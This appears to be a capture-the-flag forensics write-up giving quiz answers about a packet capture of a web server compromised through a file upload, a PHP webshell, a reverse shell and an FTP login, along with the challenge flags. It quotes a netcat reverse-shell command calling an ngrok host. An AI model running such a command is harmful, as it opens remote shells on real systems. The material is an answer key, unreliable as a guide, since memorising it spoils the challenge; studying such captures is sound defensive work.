## Solve:

### Quiz 1

1. What is the IP address for the vulnerable website? <br>
  `206.89.59.199`
2. What is the name of the file with file upload functionality? (just the name, no relative location) <br>
  `fileupload1.php`
3. What is the name of the first file uploaded? <br>
  `linux-sandwich-cracker-box.JPG`
4. Looking at the webshell uploaded, what was its original name? <br>
  `another_obfuscated_phpshell.php`
5. What is the relative location of the uploaded webshell? <br>
  `/uploads/shell.php`
6. What was the first command executed using the webshell? <br>
  `whoami`
7. What is the reverse shell command executed through the webshell? (before encoding) <br>
  `nc 0.tcp.eu.ngrok.io 17344 -e /bin/bash`
8. What is the correct order? <br>
  `[protocol]://[host]:[port]/[path]?[query]#[fragment]`
9. What type of web server was used? <br>
  `Apache/2.4.38`

<br>

### Quiz 2

1. Which user have we been spawned as after getting the reverse shell? <br>
  `www-data`
2. What is the flag you found after getting the reverse shell? <br> 
  `flag{way_to_go}`
3. What version of FTP is used on the victim server? <br>
  `vsFTPd 3.0.3`
4. What is the pair of credentials used for FTP login? <br>
  `ftpuser:flag`
5. What is the first command executed on the ftp server? <br>
  `ls`
6. How many files were available to retrieve from the ftp server? <br>
  `2`
7. On what date were the FTP files retrieved? <br>
  `27 Dec`
8. UDP packets; IPv6 packets; total number of packets; <br>
  `2; 3; 1057`
9. How many seconds did the packet capture record? <br>
  `160`
  
<br><br>

## Flag:

`flag{forensics_analyst;you_did_a_good_job}`
